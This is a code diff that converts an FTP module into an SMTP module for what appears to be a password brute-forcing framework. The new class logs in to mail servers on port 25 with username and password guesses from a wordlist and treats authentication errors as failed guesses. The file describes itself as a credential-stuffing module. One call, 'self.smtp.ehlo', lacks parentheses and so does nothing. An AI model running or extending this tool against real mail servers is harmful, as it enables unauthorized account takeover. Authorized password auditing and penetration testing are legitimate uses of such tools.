@@ -1,28 +1,29 @@
 #!/usr/bin/env python3
 """
-ftp.py
+smtp.py
 
     Module Name:
-        ftp
+        smtp
 
     Author:
         Core Maintainers
 
     Description:
-        Protocol-based module for credential stuffing FTP
+        Protocol-based module for credential stuffing smtp
 """
 
 import dataclasses
-import ftplib
+import smtplib
 
 from brute.core.protocol import ProtocolBruteforce
 
 
 @dataclasses.dataclass
-class Ftp(ProtocolBruteforce):
+class Smtp(ProtocolBruteforce):
 
-    name = "ftp"
-    port = 21
+    name = "smtp"
+    port = 25
+
 
     @property
     def success(self) -> int:
@@ -30,33 +31,29 @@ class Ftp(ProtocolBruteforce):
 
 
     def init(self):
-        """
-        Initializes the FTP client for interaction.
-        """
-        self.ftp = ftplib.FTP()
+        self.smtp = smtplib.SMTP(self.address, self.port)
 
 
     #def sanity(self):
 
 
     def brute(self, username, pwd_guess) -> int:
-        """
-        Returns status code as indicator of success
-        """
         status: int = 0
         try:
-            self.ftp.connect(self.address, self.port)
-            self.ftp.login(username, pwd_guess)
-        except ftplib.error_perm:
+            self.smtp.ehlo()
+            self.smtp.starttls()
+            self.smtp.ehlo
+            self.smtp.login(username, pwd_guess)
+        except smtplib.SMTPAuthenticationError:
             status = -1
 
-        self.ftp.quit()
+        self.smtp.close()
         return status
 
 
 if __name__ == "__main__":
-    args = Ftp.parse_args()
-    Ftp(
+    args = Smtp.parse_args()
+    Smtp(
         address = args.address,
         username = args.username,
         wordlist = args.wordlist,
